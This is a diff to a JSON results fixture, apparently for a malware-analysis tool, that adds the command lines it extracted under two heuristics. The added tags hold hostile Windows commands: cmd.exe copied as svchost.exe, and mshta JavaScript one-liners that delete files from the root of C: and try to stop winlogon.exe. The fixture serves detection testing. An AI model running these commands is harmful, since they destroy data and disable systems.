@@ -97,7 +97,16 @@
           "score_map": {},
           "signatures": {}
         },
-        "tags": {},
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "copy C:\\WINDOWS\\system32\\cmd.exe \\%%i",
+                "copy C:\\WINDOWS\\system32\\cmd.exe \\svchost.exe"
+              ]
+            }
+          }
+        },
         "title_text": "Windows Utility Manipulation",
         "zeroize_on_tag_safe": false
       },
@@ -121,7 +130,16 @@
           "score_map": {},
           "signatures": {}
         },
-        "tags": {},
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('stop -pn winlogon.exe',0);window.close()\"",
+                "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('cmd /c del /f /a /q C:\\\\*',0);window.close()\""
+              ]
+            }
+          }
+        },
         "title_text": "Execution of manipulated content",
         "zeroize_on_tag_safe": false
       },
@@ -176,7 +194,30 @@
         "signatures": []
       }
     ],
-    "tags": {},
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "copy C:\\WINDOWS\\system32\\cmd.exe \\%%i"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "copy C:\\WINDOWS\\system32\\cmd.exe \\svchost.exe"
+        },
+        {
+          "heur_id": 9,
+          "signatures": [],
+          "value": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('cmd /c del /f /a /q C:\\\\*',0);window.close()\""
+        },
+        {
+          "heur_id": 9,
+          "signatures": [],
+          "value": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('stop -pn winlogon.exe',0);window.close()\""
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
